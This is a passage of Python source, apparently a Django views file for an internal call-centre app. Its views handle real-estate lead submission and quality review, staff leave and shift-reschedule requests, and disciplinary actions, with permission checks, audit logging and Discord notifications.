    permissions = profile.permissions

    if not permissions.lead_post:
        return redirect("/access-denied")
    
    messages = Message.objects.filter(agent_notified=request.user, result="approved").order_by("-date")[:4]
    notifications = Notification.objects.filter(agent_notified=request.user).order_by("-date")[:4]
    try:
        work_status = WorkStatus.objects.filter(user=request.user).last().status
    except:
        work_status = "end_shift"
    server_set = Server_Setting.objects.get(profile_name="server_settings")

    maintenance = server_set.maintenance
    hide_client = server_set.hide_client_leadform
    hide_camp = server_set.hide_campaign_leadform

    if maintenance and str(request.user) not in admin_users:
        return redirect("/maintenance")
    
    profile = Profile.objects.get(user=request.user)
    name = profile.full_name        
    teams = Team.objects.filter(active=True)
    clients = Client.objects.filter(status="active", active=True).order_by('client_name')
    camps = Campaign.objects.filter(status="active", active=True).order_by('camp_name')

    affiliates = AffiliateUser.objects.filter(active=True)
    context = {
                'affiliates':affiliates,
               "profile":profile,
               "requestprofile":profile,
                "teams":teams,
                "clients":clients,
                "camps":camps,
                "notifications":notifications,
               'messages':messages,
               'permissions':permissions,
               'work_status':work_status,
               'hide_client':hide_client,
               'hide_camp':hide_camp,
               }
    
    if request.method == "POST":
            data = request.POST
            agent_nick=data.get('agent_nick') #Dialer Username
            agent_user = profile.dialer_user
            clientname = data.get('client_name')
            camp = data.get('camp')
            property_type = data.get('property_type').lower()
            owner_name = data.get('ownername')
            phone = data.get('phone')
            email = data.get('email')
            property_address = data.get('address')
            zillow_url = data.get('zillow_url')
            timeline = data.get('timeline')
            reason = data.get('reason')
            price = data.get('price')
            market_value = data.get('marketvalue')
            callback = data.get('callback')
            general_info = data.get('general_info')
            extrainfo = data.get('extrainfo')
            
            phonetrimed = (((phone.replace('(','')).replace(")","")).replace('-',"")).replace(" ","")

            if hide_camp:
                campaignget = None
            else:
                campaignget= Campaign.objects.get(camp_name=camp)
            
            if hide_client:
                client = None
            else:
                client = Client.objects.get(client_name=clientname)

            date = datetime.now(timezone('US/Eastern')).date()
            time = datetime.now(timezone('US/Eastern')).time()
            leade = Lead_Submission.objects.create(pushed_date=date,pushed_time=time,agent=request.user, agent_name=profile.full_name,
                                                      agent_user=agent_user, dialer_nick=agent_nick,
                                                      client=client,
                                                      campaign=campaignget,
                                                      property_type=property_type, seller_name=owner_name,
                                                      seller_phone=phonetrimed, property_address=property_address,
                                                      timeline=timeline, reason=reason,
                                                      asking_price=price, market_value=market_value,
                                                      callback=callback, general_info=general_info,
                                                      extra_notes=extrainfo,zillow_url=zillow_url,seller_email=email)
            
            date = datetime.now(timezone('US/Eastern')).date()
            time = datetime.now(timezone('US/Eastern')).time()
            utc_now = datetime.utcnow()

            # Get the timezone object for 'America/New_York'
            est_timezone = pytz.timezone('America/New_York')

            # Convert UTC time to Eastern timezone
            est_time = utc_now.replace(tzinfo=pytz.utc).astimezone(est_timezone)

            # Format the time as HH:MM:SS string
            est = est_time.strftime('%I:%M:%S %p')

            # Construct the content of the embed with quote formatting
            request_ip = request.META.get('REMOTE_ADDR')
            try:

                lead = Lead_Submission.objects.filter(agent=request.user).last()
                lead_id = lead.lead_id
                mention1 = f'<@262585653072625665>'
                #mention2 = f'<@979390450865688596>'
                mention3 = f'<@1144817547519201350>'
                content = f'**Agent:** {profile.full_name}\n\n**Action:** Posted a New Lead for **{str(client).upper()}**\n\n**Eastern:** {est}\n\n**IP Address:** {request_ip} \n\n {mention3} '

                send_discord_message_lead(content,lead_id)
            except:
                pass
            #Log.objects.create(date=date,user=request.user,user_profile=profile,time=time,lead=leade,log_info="Submitted a Lead, Lead ID: "+str(leade.lead_id))

            return redirect('/leads-view')
    return render(request, "lead_forms/lead_form.html",context)



@login_required(login_url="/login")
def lead_view(request):

    profile = Profile.objects.get(user=request.user)
    permissions = profile.permissions
    
    if not permissions.today_leads:
        return redirect("/access-denied")
    
    messages = Message.objects.filter(agent_notified=request.user, result="approved").order_by("-date")[:4]
    notifications = Notification.objects.filter(agent_notified=request.user).order_by("-date")[:4]
    try:
        work_status = WorkStatus.objects.filter(user=request.user).last().status
    except:
        work_status = "end_shift"    
    maintenance = Server_Setting.objects.get(profile_name="server_settings").maintenance
    if maintenance and str(request.user) not in admin_users:
        return redirect("/maintenance")

    profile = Profile.objects.get(user=request.user)
    name = profile.full_name        
    teams = Team.objects.filter(active=True)
    today_date = datetime.now(timezone('US/Eastern')).date()
    leads = Lead_Submission.objects.filter(agent=request.user,pushed_date=today_date, active=True).order_by('-pushed_date', '-pushed_time')
    affiliates = AffiliateUser.objects.filter(active=True)
    context = {
                'affiliates':affiliates,
               "profile":profile,
               "requestprofile":profile,
                "teams":teams,
                "leads":leads,
                "today_date":today_date,
                "notifications":notifications,
                'messages':messages,
                'permissions':permissions,
                'work_status':work_status,
    }


    return render(request, "lead_forms/submitted_leads_today_agent.html",context)

@login_required(login_url="/login")
def lead_report(request, lead_id):

    profile = Profile.objects.get(user=request.user)
    permissions = profile.permissions
    if not permissions.today_leads:
        return redirect("/access-denied")
    messages = Message.objects.filter(agent_notified=request.user, result="approved").order_by("-date")[:4]
    notifications = Notification.objects.filter(agent_notified=request.user).order_by("-date")[:4]
    try:
        work_status = WorkStatus.objects.filter(user=request.user).last().status
    except:
        work_status = "end_shift"    
        
    maintenance = Server_Setting.objects.get(profile_name="server_settings").maintenance
    if maintenance and str(request.user) not in admin_users:
        return redirect("/maintenance")
    
    profile = Profile.objects.get(user=request.user)
    name = profile.full_name        
    teams = Team.objects.filter(active=True)
    today_date = datetime.now(timezone('US/Eastern')).date()
    lead = Lead_Submission.objects.get(lead_id=lead_id)
    lead_owner = lead.agent
    if lead_owner != request.user:
        return redirect("/access-denied")
    
    affiliates = AffiliateUser.objects.filter(active=True)
    context = {
                'affiliates':affiliates,
               "profile":profile,
               "requestprofile":profile,
                "teams":teams,
                "lead":lead,
                "today_date":today_date,
               'messages':messages,
               'permissions':permissions,
               'work_status':work_status,
    }

    return render(request, "lead_forms/lead_report_agent.html",context)

@login_required(login_url="/login")
def quality_pending_lead_view(request):

    profile = Profile.objects.get(user=request.user)
    permissions = profile.permissions
    if not permissions.quality_pending:
        return redirect("/access-denied")

    messages = Message.objects.filter(agent_notified=request.user, result="approved").order_by("-date")[:4]
    notifications = Notification.objects.filter(agent_notified=request.user).order_by("-date")[:4]
    try:
        work_status = WorkStatus.objects.filter(user=request.user).last().status
    except:
        work_status = "end_shift"    
    
    maintenance = Server_Setting.objects.get(profile_name="server_settings").maintenance
    if maintenance and str(request.user) not in admin_users:
        return redirect("/maintenance")
    
    profile = Profile.objects.get(user=request.user)
    name = profile.full_name        
    teams = Team.objects.filter(active=True)
    today_date = datetime.now(timezone('US/Eastern')).date()
    leads = Lead_Submission.objects.filter(lead_status="pending", active=True).order_by('-pushed_date', '-pushed_time')

    affiliates = AffiliateUser.objects.filter(active=True)
    context = {
                'affiliates':affiliates,
               "profile":profile,
               "requestprofile":profile,
                "teams":teams,
                "leads":leads,
                "today_date":today_date,
                "notifications":notifications,
               'messages':messages,
               'permissions':permissions,
               'work_status':work_status,
               }


    return render(request, "lead_forms/pending_leads_report_quality.html",context)

@login_required(login_url="/login")
def quality_lead_report(request, lead_id):


    profile = Profile.objects.get(user=request.user)
    permissions = profile.permissions

    if permissions.quality_pending or permissions.client_dashboard:
        pass
    else:
        return redirect("/access-denied")

    
    messages = Message.objects.filter(agent_notified=request.user, result="approved").order_by("-date")[:4]
    notifications = Notification.objects.filter(agent_notified=request.user).order_by("-date")[:4]
    try:
        work_status = WorkStatus.objects.filter(user=request.user).last().status
    except:
        work_status = "end_shift"
    
    maintenance = Server_Setting.objects.get(profile_name="server_settings").maintenance
    if maintenance and str(request.user) not in admin_users:
        return redirect("/maintenance")

    profile = Profile.objects.get(user=request.user)
    name = profile.full_name        
    
    teams = Team.objects.filter(active=True)
    today_date = datetime.now(timezone('US/Eastern')).date()
    lead = Lead_Submission.objects.get(lead_id=lead_id)

    if lead.lead_status != "pending":
        handled = lead.handled_by
        if handled != request.user and not permissions.quality_head:
            return redirect("/access-denied")
        

    clients = Client.objects.filter(status="active", active=True).order_by('client_name')
    camps = Campaign.objects.filter(status="active", active=True).order_by('camp_name')  
    types = ["House","Land","Business"]

    affiliates = AffiliateUser.objects.filter(active=True)

    context = {
                'affiliates':affiliates,
               "profile":profile,
               "requestprofile":profile,
                "teams":teams,
                "lead":lead,
                "today_date":today_date,
                "clients":clients,
                "camps":camps,
                "types":types,
                "notifications":notifications,
                'messages':messages,
                'permissions':permissions,
                'work_status':work_status,
    }

    

    if request.method == "POST":
                data = request.POST
                agent_user=data.get('agentuser') #Dialer Username
                clientname = data.get('client_name')
                camp = data.get('camp')
                property_type = data.get('property_type').lower()
                lead_status = data.get('lead_status').lower()
                owner_name = data.get('ownername')
                phone = data.get('phone')
                email = data.get('email')
                property_address = data.get('address')
                zillow_url = data.get('zillow_url')
                timeline = data.get('timeline')
                reason = data.get('reason')
                price = data.get('price')
                market_value = data.get('marketvalue')
                callback = data.get('callback')
                general_info = data.get('general_info')
                extrainfo = data.get('extrainfo')
                quality_notes = data.get('quality_notes')
                quality_to_agent_notes = data.get('quality_to_agent_notes')

                
                client = Client.objects.get(client_name=clientname)
                try:
                    campaignget= Campaign.objects.get(camp_name=camp)
                except:
                    campaignget = None
                leadup = Lead_Submission.objects.get(lead_id=lead_id)
                leadup.client=client
                leadup.campaign=campaignget
                leadup.lead_status = lead_status
                leadup.property_type=property_type
                leadup.seller_email = email
                leadup.zillow_url = zillow_url
                leadup.seller_name=owner_name
                leadup.seller_phone=phone
                leadup.property_address=property_address
                leadup.timeline=timeline
                leadup.reason=reason
                leadup.asking_price=price
                leadup.market_value=market_value
                leadup.callback=callback
                leadup.general_info=general_info
                leadup.extra_notes=extrainfo
                leadup.quality_notes=quality_notes
                leadup.quality_to_agent_notes=quality_to_agent_notes
                leadup.handled_by = request.user

                leadup.save()
                if lead_status.lower() != "pending":
                    user = leadup.agent
                    lead_link = "https://nedialo.app/lead/"+str(lead_id)
                    userid = int(Profile.objects.get(user=user).discord)
                    content = "Your Lead has been assigned as **" + lead_status.title()  + "** to view the Quality Notes on it.\n"+ " [CLICK HERE]"+ "("+lead_link+")" 
                    try:
                        discord_private(userid,content)
                    except:
                        pass
                        
                date = datetime.now(timezone('US/Eastern')).date()
                time = datetime.now(timezone('US/Eastern')).time()
                request_ip = request.META.get('REMOTE_ADDR')

                Log.objects.create(request_ip=request_ip, date=date,user=request.user,user_profile=profile,time=time,lead=leadup,log_info="Handled a Lead, Lead ID: "+str(leadup.lead_id)+" Status: "+str(data.get('lead_status')))

                return redirect('/quality-pending-leads')

    return render(request, "lead_forms/lead_report_quality.html",context)

@login_required(login_url="/login")
def all_leads_search_quality(request):

    profile = Profile.objects.get(user=request.user)
    permissions = profile.permissions

    if not permissions.quality_search:
        return redirect("/access-denied")
 
    messages = Message.objects.filter(agent_notified=request.user, result="approved").order_by("-date")[:4]
    notifications = Notification.objects.filter(agent_notified=request.user).order_by("-date")[:4]
    try:
        work_status = WorkStatus.objects.filter(user=request.user).last().status
    except:
        work_status = "end_shift"
    
    maintenance = Server_Setting.objects.get(profile_name="server_settings").maintenance
    if maintenance and str(request.user) not in admin_users:
        return redirect("/maintenance")

    profile = Profile.objects.get(user=request.user)
    name = profile.full_name        
    
    teams = Team.objects.filter(active=True)
    today_date = datetime.now(timezone('US/Eastern')).date()
    leads = Lead_Submission.objects.filter(active=True).order_by('-pushed_date', '-pushed_time')

    affiliates = AffiliateUser.objects.filter(active=True)
    clients = Client.objects.filter(active=True)
    context = {
                'affiliates':affiliates,
                'clients':clients,
               "profile":profile,
               "requestprofile":profile,
                "teams":teams,
                "today_date":today_date,
                "notifications":notifications,
                'messages':messages,
                'permissions':permissions,
                'work_status':work_status,}

    if request.method == "POST":
        if 'search_by_name' in request.POST:
            data = request.POST
            client = data.get('client')
            start_date=data.get('start_date') 
            end_date=data.get('end_date') 
            qualified = data.get('qualified')
            disqualified = data.get('disqualified')
            callback = data.get('callback')
            duplicate = data.get('duplicate')
            pending = data.get('pending')

            lead_results = {
                            "qualified": qualified,
                            "disqualified": disqualified,
                            "callback": callback,
                            "duplicate": duplicate,
                            "pending":pending,
                            }
            lead_results_active = []
            for result in lead_results:

                if str(lead_results[result]) == "None":
                    pass
                elif str(lead_results[result]) == "on":
                    lead_results_active.append(str(result)) 
            if client == "All Clients":
                leads_searched = Lead_Submission.objects.filter(lead_status__in=lead_results_active, pushed_date__range=[start_date, end_date], active=True).order_by('-pushed_date', '-pushed_time')
            else:
                client = Client.objects.get(client_name=client)
                leads_searched = Lead_Submission.objects.filter(client=client, lead_status__in=lead_results_active, pushed_date__range=[start_date, end_date], active=True).order_by('-pushed_date', '-pushed_time')
            affiliates = AffiliateUser.objects.filter(active=True)
            context = {
                'affiliates':affiliates,
                "profile":profile,
                    "teams":teams,
                    "requestprofile":profile,
                    "leads":leads_searched,
                    "today_date":today_date,
                    "notifications":notifications,
                    'messages':messages,
                    'permissions':permissions,
                    'work_status':work_status,
                    }
            return render(request, "lead_forms/all_leads_searched_quality.html",context)
        
        elif 'search_by_phone' in request.POST:
            data = request.POST
            number = data.get('phone_search')
            
            number = (((number.replace('(','')).replace(")","")).replace('-',"")).replace(" ","")

            leads_searched = Lead_Submission.objects.filter(seller_phone=number, active=True).order_by('-pushed_date', '-pushed_time')
                    
            affiliates = AffiliateUser.objects.filter(active=True)
            context = {
                'affiliates':affiliates,
                "profile":profile,
                "requestprofile":profile,
                    "teams":teams,
                    "leads":leads_searched,
                    "today_date":today_date,
                    "notifications":notifications,
                    'messages':messages,
                    'permissions':permissions,
                    'work_status':work_status,}

                    
            return render(request, "lead_forms/all_leads_searched_quality.html",context)


    return render(request, "lead_forms/all_leads_quality.html",context)

@login_required(login_url="/login")
def leave_request(request):

    profile = Profile.objects.get(user=request.user)
    permissions = profile.permissions

    if not permissions.leave_request:
        return redirect("/access-denied")

    messages = Message.objects.filter(agent_notified=request.user, result="approved").order_by("-date")[:4]
    notifications = Notification.objects.filter(agent_notified=request.user).order_by("-date")[:4]
    try:
        work_status = WorkStatus.objects.filter(user=request.user).last().status
    except:
        work_status = "end_shift"
    
    maintenance = Server_Setting.objects.get(profile_name="server_settings").maintenance
    if maintenance and str(request.user) not in admin_users:
        return redirect("/maintenance")

    profile = Profile.objects.get(user=request.user)
    name = profile.full_name        
    
    agent_name = profile.full_name
    teams = Team.objects.filter(active=True)
    today_date = datetime.now(timezone('US/Eastern')).date()
    leave_type = ["UPL","Annual","Casual","Sick"]

    affiliates = AffiliateUser.objects.filter(active=True)
    context = {
                'affiliates':affiliates,
               "profile":profile,
               "requestprofile":profile,
                "teams":teams,
                "today_date":today_date,
                "leave_type":leave_type,
                "notifications":notifications,
                'messages':messages,
                'permissions':permissions,
                'work_status':work_status,
                }
    
    if request.method == "POST":
        data = request.POST

        agent_profile = Profile.objects.get(user=request.user)
        agent_name = agent_profile.full_name
        agent_team = agent_profile.team
        
        today_date = today_date
        leave_type = data.get("leave_type").lower()
        leave_date = data.get('requested_date')
        leave_reason = data.get('leave_reason')
        leave = Leave.objects.create(agent=request.user,
                                     agent_name=agent_name,
                                    team=agent_team,
                                    leave_type=leave_type,
                                    submission_date=today_date,
                                    requested_date=leave_date,
                                    reason=leave_reason
                                    )
        request_ip = request.META.get('REMOTE_ADDR')

        utc_now = datetime.utcnow()

        # Get the timezone object for 'America/New_York'
        est_timezone = pytz.timezone('America/New_York')

        # Convert UTC time to Eastern timezone
        est_time = utc_now.replace(tzinfo=pytz.utc).astimezone(est_timezone)

        # Format the time as HH:MM:SS string
        est = est_time.strftime('%I:%M:%S %p')
        mention1 = f'<@262585653072625665>'
        mention2 = f'<@979390450865688596>'
        mention3 = f'<@1144817547519201350>'
        mention4 = f'<@979421026976927785>'
        content = f'**Agent:** {profile.full_name}\n\n**Action:** Requested a Leave on **[{leave.requested_date}]**\n\n**Eastern:** {est}\n\n**IP Address:** {request_ip} \n\n {mention2} - {mention4} '
        try:
            send_discord_message_requests(content,leave.id,'leave')
        except:
            pass
        date = datetime.now(timezone('US/Eastern')).date()
        time = datetime.now(timezone('US/Eastern')).time()
        Log.objects.create(request_ip=request_ip,date=date,user=request.user,user_profile=profile,time=time,leave=leave,log_info="Requested a Leave, Leave ID: "+str(leave.id)+" Leave Type: "+str(data.get("leave_type")))


        return redirect('/leaves-list')



    return render(request, "requests/leave_request.html",context)

@login_required(login_url="/login")
def reschedule_request(request):

    profile = Profile.objects.get(user=request.user)
    permissions = profile.permissions

    if not permissions.reschedule_request:
        return redirect("/access-denied")


    messages = Message.objects.filter(agent_notified=request.user, result="approved").order_by("-date")[:4]
    notifications = Notification.objects.filter(agent_notified=request.user).order_by("-date")[:4]
    try:
        work_status = WorkStatus.objects.filter(user=request.user).last().status
    except:
        work_status = "end_shift"
    maintenance = Server_Setting.objects.get(profile_name="server_settings").maintenance
    if maintenance and str(request.user) not in admin_users:
        return redirect("/maintenance")

    profile = Profile.objects.get(user=request.user)
    name = profile.full_name        
    
    teams = Team.objects.filter(active=True)
    today_date = datetime.now(timezone('US/Eastern')).date()
    shift_start = profile.login_time

    affiliates = AffiliateUser.objects.filter(active=True)
    context = {
               'affiliates':affiliates,
               "profile":profile,
                "teams":teams,
                "requestprofile":profile,
                "today_date":today_date,
                "shift_start":shift_start,
                "notifications":notifications,
               'messages':messages,
               'permissions':permissions,
               'work_status':work_status,
               }

    if request.method == "POST":
        data = request.POST
        agent_profile = Profile.objects.get(user=request.user)
        agent_team = agent_profile.team
        agent_name = agent_profile.full_name
        today_date = today_date
    
        reschedule_time = data.get("reschedule_time")
        reschedule_date = data.get('requested_date')
        reschedule_reason = data.get('reschedule_reason')
        reschedule = Shift_Reschedule.objects.create(agent=request.user,
                                    agent_name=agent_name,
                                    team=agent_team,
                                    shift_start=shift_start,
                                    reschedule_time=reschedule_time,
                                    submission_date=today_date,
                                    requested_date=reschedule_date,
                                    reason=reschedule_reason
                                    )
        date = datetime.now(timezone('US/Eastern')).date()
        time = datetime.now(timezone('US/Eastern')).time()
        request_ip = request.META.get('REMOTE_ADDR')

        utc_now = datetime.utcnow()

        # Get the timezone object for 'America/New_York'
        est_timezone = pytz.timezone('America/New_York')

        # Convert UTC time to Eastern timezone
        est_time = utc_now.replace(tzinfo=pytz.utc).astimezone(est_timezone)

        # Format the time as HH:MM:SS string
        est = est_time.strftime('%I:%M:%S %p')
        mention1 = f'<@262585653072625665>'
        mention2 = f'<@979390450865688596>'
        mention3 = f'<@1144817547519201350>'
        mention4 = f'<@979421026976927785>'
        content = f'**Agent:** {profile.full_name}\n\n**Action:** Requested a Shift-Reschedule on **[{reschedule.requested_date}]**\n\n**Eastern:** {est}\n\n**IP Address:** {request_ip} \n\n {mention2}'
        try:
            send_discord_message_requests(content,reschedule.id,'reschedule')
        except:
            pass
        Log.objects.create(request_ip=request_ip,date=date,user=request.user,user_profile=profile,time=time,reschedule=reschedule,log_info="Requested a Shift Reschedule, Reschedule ID: "+str(reschedule.id)+" Reschedule Time: "+str(reschedule_time))

        return redirect('/reschedules-list')



    return render(request, "requests/reschedule_request.html",context)


@login_required(login_url="/login")
def action_request(request):

    profile = Profile.objects.get(user=request.user)
    permissions = profile.permissions

    if not permissions.action_request:
        return redirect("/access-denied")

    messages = Message.objects.filter(agent_notified=request.user, result="approved").order_by("-date")[:4]
    notifications = Notification.objects.filter(agent_notified=request.user).order_by("-date")[:4]
    try:
        work_status = WorkStatus.objects.filter(user=request.user).last().status
    except:
        work_status = "end_shift"
    maintenance = Server_Setting.objects.get(profile_name="server_settings").maintenance
    if maintenance and str(request.user) not in admin_users:
        return redirect("/maintenance")

    name = profile.full_name        
    
    teams = Team.objects.filter(active=True)
    today_date = datetime.now(timezone('US/Eastern')).date()
    action_types = ["Written Warning", "Deduction", "Termination"]
    
    affiliates = AffiliateUser.objects.filter(active=True)

    context = {
                'affiliates':affiliates,
               "profile":profile,
               "requestprofile":profile,
                "teams":teams,
                "today_date":today_date,
                "action_types":action_types,
                "notifications":notifications,
                'messages':messages,
                'permissions':permissions,
                'work_status':work_status,
                }

    
    if request.method == "POST":
        data = request.POST
        agent_profile = Profile.objects.get(user=request.user)
        today_date = today_date
        agent_id = data.get("agent_id")
        action_type = data.get('action_type').lower()
        action_reason = data.get('action_reason')
        action_evidence = data.get('action_evidence')
        incident_date = data.get('incident_date')
        action_amount = data.get('action_amount')
        try:
            agent = Profile.objects.get(userid=agent_id).user
        except:
            return render(request, "errors/error-404-profile.html")

        agent_name = Profile.objects.get(userid=agent_id).full_name
        accuser_name = Profile.objects.get(user=request.user).full_name
        if action_amount == '' or action_amount is None or action_amount == "None":
            # action_amount is blank or None, set it to None
            action_amount = 0
        if action_type == "written warning":
            action_type = "warning"

        action = Action.objects.create(agent=agent,
                                    accuser=request.user,
                                    agent_name=agent_name,
                                    accuser_name=accuser_name,
                                    action_type=action_type,
                                    submission_date=today_date,
                                    incident_date=incident_date,
                                    reason=action_reason,
                                    evidence=action_evidence,
                                    deduction_amount=action_amount,
                                    )
        date = datetime.now(timezone('US/Eastern')).date()
        time = datetime.now(timezone('US/Eastern')).time()
        request_ip = request.META.get('REMOTE_ADDR')
        
        utc_now = datetime.utcnow()

        # Get the timezone object for 'America/New_York'
        est_timezone = pytz.timezone('America/New_York')

        # Convert UTC time to Eastern timezone
        est_time = utc_now.replace(tzinfo=pytz.utc).astimezone(est_timezone)

        # Format the time as HH:MM:SS string
        est = est_time.strftime('%I:%M:%S %p')
        mention1 = f'<@262585653072625665>'
        mention2 = f'<@979390450865688596>'
        mention3 = f'<@1144817547519201350>'
        mention4 = f'<@979421026976927785>'
        content = f'**Agent:** {profile.full_name}\n\n**Action:** Requested an Action  on **{action.agent_name}**\n\n**Eastern:** {est}\n\n**IP Address:** {request_ip} \n\n {mention4}'
        try:
            send_discord_message_requests(content,action.id,'action')
        except:
            pass
        Log.objects.create(request_ip=request_ip,date=date,user=request.user,user_profile=profile,time=time,action=action,log_info="Requested an Action, Action ID: "+str(action.id)+ " Type: "+str(data.get('action_type')) + " Amount: "+str(action_amount))


    
        return redirect('/actions-list')

    return render(request, "requests/action_request.html",context)


@login_required(login_url="/login")
def action_list_view(request):

    profile = Profile.objects.get(user=request.user)
    permissions = profile.permissions

    if not permissions.action_request:
        return redirect("/access-denied")

    messages = Message.objects.filter(agent_notified=request.user, result="approved").order_by("-date")[:4]
    notifications = Notification.objects.filter(agent_notified=request.user).order_by("-date")[:4]
    try:
        work_status = WorkStatus.objects.filter(user=request.user).last().status
    except:
        work_status = "end_shift"
    maintenance = Server_Setting.objects.get(profile_name="server_settings").maintenance
    if maintenance and str(request.user) not in admin_users:
        return redirect("/maintenance")
    
    profile = Profile.objects.get(user=request.user)
    name = profile.full_name        
    
    teams = Team.objects.filter(active=True)
    today_date = datetime.now(timezone('US/Eastern')).date()
    actions = Action.objects.filter(accuser=request.user, active=True).order_by('-submission_date')[:15]

    affiliates = AffiliateUser.objects.filter(active=True)

    context = {
                "affiliates":affiliates,
               "profile":profile,
                "teams":teams,
                "requestprofile":profile,
                "actions":actions,
                "today_date":today_date,
                "notifications":notifications,
               'messages':messages,
               'permissions':permissions,
               'work_status':work_status,
               }

    return render(request, "requests/action_list.html",context)


@login_required(login_url="/login")
def leave_list_view(request):

    profile = Profile.objects.get(user=request.user)
    permissions = profile.permissions

    if not permissions.leave_request:
        return redirect("/access-denied")

    messages = Message.objects.filter(agent_notified=request.user, result="approved").order_by("-date")[:4]
    notifications = Notification.objects.filter(agent_notified=request.user).order_by("-date")[:4]
    try:
        work_status = WorkStatus.objects.filter(user=request.user).last().status
    except:
        work_status = "end_shift"
    maintenance = Server_Setting.objects.get(profile_name="server_settings").maintenance
    if maintenance and str(request.user) not in admin_users:
        return redirect("/maintenance")
    
    profile = Profile.objects.get(user=request.user)
    name = profile.full_name        
    
    teams = Team.objects.filter(active=True)
    today_date = datetime.now(timezone('US/Eastern')).date()
    leaves = Leave.objects.filter(agent=request.user, active=True).order_by('-submission_date')[:15]

    
    affiliates = AffiliateUser.objects.filter(active=True)

    context = {
               'affiliates':affiliates,
               "requestprofile":profile,
                "teams":teams,
                
                "leaves":leaves,
                "today_date":today_date,
                "notifications":notifications,
               'messages':messages,
               'permissions':permissions,
               'work_status':work_status,
               }


    return render(request, "requests/leave_list.html",context)


@login_required(login_url="/login")
def reschedule_list_view(request):

    profile = Profile.objects.get(user=request.user)
    permissions = profile.permissions

    if not permissions.reschedule_request:
        return redirect("/access-denied")

    messages = Message.objects.filter(agent_notified=request.user, result="approved").order_by("-date")[:4]
    notifications = Notification.objects.filter(agent_notified=request.user).order_by("-date")[:4]
    try:
        work_status = WorkStatus.objects.filter(user=request.user).last().status
    except:
        work_status = "end_shift"
    maintenance = Server_Setting.objects.get(profile_name="server_settings").maintenance
    if maintenance and str(request.user) not in admin_users:
        return redirect("/maintenance")
    
    profile = Profile.objects.get(user=request.user)
    name = profile.full_name        
    

    teams = Team.objects.filter(active=True)
    today_date = datetime.now(timezone('US/Eastern')).date()
    reschedules = Shift_Reschedule.objects.filter(agent=request.user, active=True).order_by('-submission_date')[:15]

    affiliates = AffiliateUser.objects.filter(active=True)
    context = {
               'affiliates':affiliates,
               "profile":profile,
                "teams":teams,
                "requestprofile":profile,
                "reschedules":reschedules,
                "today_date":today_date,
                "notifications":notifications,
               'messages':messages,
               'permissions':permissions,
               'work_status':work_status,
               }


    return render(request, "requests/reschedule_list.html",context)


@login_required(login_url="/login")
def actions_list_handling(request):

    profile = Profile.objects.get(user=request.user)
    permissions = profile.permissions

    if not permissions.deduction_handling:
        return redirect("/access-denied")
    
    messages = Message.objects.filter(agent_notified=request.user, result="approved").order_by("-date")[:4]
    notifications = Notification.objects.filter(agent_notified=request.user).order_by("-date")[:4]
    try:
        work_status = WorkStatus.objects.filter(user=request.user).last().status
    except:
        work_status = "end_shift"
    maintenance = Server_Setting.objects.get(profile_name="server_settings").maintenance
    if maintenance and str(request.user) not in admin_users:
        return redirect("/maintenance")
    
    profile = Profile.objects.get(user=request.user)
    name = profile.full_name        
    
    teams = Team.objects.filter(active=True)
    today_date = datetime.now(timezone('US/Eastern')).date()
    actions = Action.objects.filter(status="pending", active=True).order_by('-submission_date')[:20]
    affiliates = AffiliateUser.objects.filter(active=True)
    context = {
               'affiliates':affiliates,
               "profile":profile,
                "teams":teams,
                "requestprofile":profile,
                "actions":actions,
                "today_date":today_date,
                "notifications":notifications,
               'messages':messages,
               'permissions':permissions,
               'work_status':work_status,
               }

    return render(request, "requests-handling/actions_handling_pending.html",context)



@login_required(login_url="/login")
def actions_handling_search(request):

    profile = Profile.objects.get(user=request.user)
    permissions = profile.permissions

    if not permissions.deduction_handling:
        return redirect("/access-denied")
    
    messages = Message.objects.filter(agent_notified=request.user, result="approved").order_by("-date")[:4]
    notifications = Notification.objects.filter(agent_notified=request.user).order_by("-date")[:4]
    try:
        work_status = WorkStatus.objects.filter(user=request.user).last().status
    except:
        work_status = "end_shift"
    maintenance = Server_Setting.objects.get(profile_name="server_settings").maintenance
    if maintenance and str(request.user) not in admin_users:
        return redirect("/maintenance")

    profile = Profile.objects.get(user=request.user)
    name = profile.full_name        
    
    teams = Team.objects.filter(active=True)
    today_date = datetime.now(timezone('US/Eastern')).date()

    affiliates = AffiliateUser.objects.filter(active=True)
    context = {
               'affiliates':affiliates,
               "profile":profile,
                "teams":teams,
                "requestprofile":profile,
                "today_date":today_date,
                "notifications":"notifications",
               'messages':messages,
               'permissions':permissions,
               'work_status':work_status,
               }

    if request.method == "POST":
        if 'search_by_name' in request.POST:
            data = request.POST
            start_date=data.get('start_date') 
            end_date=data.get('end_date') 
            approved = data.get('approved')
            rejected = data.get('rejected')
            pending = data.get('pending')

            actions_results = {
                            "approved": approved,
                            "rejected": rejected,
                            "pending": pending,
                            }
            action_results_active = []
            for result in actions_results:

                if str(actions_results[result]) == "None":
                    pass
                elif str(actions_results[result]) == "on":
                    action_results_active.append(str(result)) 

            actions_searched = Action.objects.filter(status__in=action_results_active, submission_date__range=[start_date, end_date], active=True).order_by('-submission_date')
            affiliates = AffiliateUser.objects.filter(active=True)

            context = {
                    'affiliates':affiliates,
                    "profile":profile,
                    "teams":teams,
                    "requestprofile":profile,
                    "actions":actions_searched,
                    "today_date":today_date,
                    "notifications":notifications,
                    'messages':messages,
                    'permissions':permissions,
                    'work_status':work_status
                    }
            

            return render(request, "requests-handling/actions_search_results.html",context)
        



    return render(request, "requests-handling/actions_search.html",context)


@login_required(login_url="/login")
def action_handling_report(request, action_id):

    profile = Profile.objects.get(user=request.user)
    permissions = profile.permissions

    if not permissions.deduction_handling:
        return redirect("/access-denied")
    
    messages = Message.objects.filter(agent_notified=request.user, result="approved").order_by("-date")[:4]
    notifications = Notification.objects.filter(agent_notified=request.user).order_by("-date")[:4]
    try:
        work_status = WorkStatus.objects.filter(user=request.user).last().status
    except:
        work_status = "end_shift"
    maintenance = Server_Setting.objects.get(profile_name="server_settings").maintenance
    if maintenance and str(request.user) not in admin_users:
        return redirect("/maintenance")

    profile = Profile.objects.get(user=request.user)
    name = profile.full_name        
    
    teams = Team.objects.filter(active=True)
    today_date = datetime.now(timezone('US/Eastern')).date()
    action = Action.objects.get(id=action_id)
    accuser_name = Profile.objects.get(user=action.accuser)

    action_types = [""]
    action_result_types = ["Approved","Rejected","Pending"]

    affiliates = AffiliateUser.objects.filter(active=True)
    context = {
               'affiliates':affiliates,
               "profile":profile,
                "teams":teams,
                "requestprofile":profile,
                "action":action,
                "accuser_name":accuser_name,
                "today_date":today_date,
                "action_result_types":action_result_types,
                "notifications":notifications,
               'messages':messages,
               'permissions':permissions,
               'work_status':work_status,
               }
    
    

    if request.method == "POST":
        data = request.POST
